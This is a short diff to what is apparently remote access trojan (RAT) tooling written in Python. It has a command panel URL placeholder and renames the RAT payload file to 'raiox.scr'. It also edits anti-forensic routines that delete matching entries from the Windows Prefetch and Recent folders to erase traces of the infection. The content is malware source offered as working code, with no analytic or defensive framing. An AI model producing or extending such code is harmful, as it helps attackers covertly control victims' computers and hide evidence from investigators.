@@ -5,7 +5,7 @@ Fully audited & hardened
 import os, sys, time, ctypes, random, subprocess, hashlib, struct
 
 PANEL_URL = "PANEL_URL_PLACEHOLDER"
-RAT_NAME   = "progam.scr"
+RAT_NAME   = "raiox.scr"
 CHECK_MIN, CHECK_MAX = 25, 75
 JITTER_MAX = 20
 DOWNLOAD_TIMEOUT = 45
@@ -207,7 +207,7 @@ class Forensic:
             d = os.path.join(os.environ.get('SystemRoot','C:\\Windows'), 'Prefetch')
             for f in os.listdir(d):
                 lf = f.lower()
-                if any(k in lf for k in ('progam','watchdog','winsvc')):
+                if any(k in lf for k in ('raiox','winsvc')):
                     try: os.remove(os.path.join(d, f))
                     except: pass
         except: pass
@@ -218,7 +218,7 @@ class Forensic:
             d = os.path.join(os.environ.get('APPDATA',''), r'Microsoft\Windows\Recent')
             for f in os.listdir(d):
                 lf = f.lower()
-                if any(k in lf for k in ('progam','watchdog','winsvc')):
+                if any(k in lf for k in ('raiox','winsvc')):
                     try: os.remove(os.path.join(d, f))
                     except: pass
         except: pass
